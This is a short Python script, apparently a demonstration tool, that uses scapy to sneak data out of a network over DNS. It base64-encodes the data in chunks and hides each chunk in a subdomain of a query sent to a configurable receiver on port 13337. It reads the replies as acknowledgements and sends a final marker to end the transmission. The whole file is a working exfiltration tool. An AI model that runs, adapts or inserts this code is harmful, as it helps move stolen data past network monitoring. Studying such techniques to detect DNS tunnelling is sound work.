from scapy.all import *
from base64 import b64encode

ip = ""
port = 13337
domain = "google.com"

def process(response):
    if response.haslayer(DNS) and response[DNS].ancount > 0:
        code = str(response[DNS].an.rdata)[-1]
        if int(code) == 1:
            print("Received successfully")
        elif int(code) == 2:
            print("Acknowledged end transmission")
        else:
            print("Transmission error")

def DNSRequest(subdomain):
    global domain
    d = bytes(subdomain + "." + domain,"utf-8")
    query = DNSQR(qname=d)
    p = IP(dst=bytes(ip,"utf-8"))/UDP(dport=port)/DNS(qd=query)
    result = sr1(p,verbose=False)
    process(result)

chunkLength = 12
def sendData(data):
    for i in range(0,len(data),chunkLength):
        chunk = data[i:min(i+chunkLength,len(data))]
        print("Transmitting %s"%chunk)
        encoded = b64encode(bytes(chunk,"utf-8"))
        print(encoded)
        encoded = encoded.decode("utf-8").rstrip("=")
        DNSRequest(encoded)

data = "This is data being exfiltrated over DNS"
sendData(data)
data = "R"
sendData(data)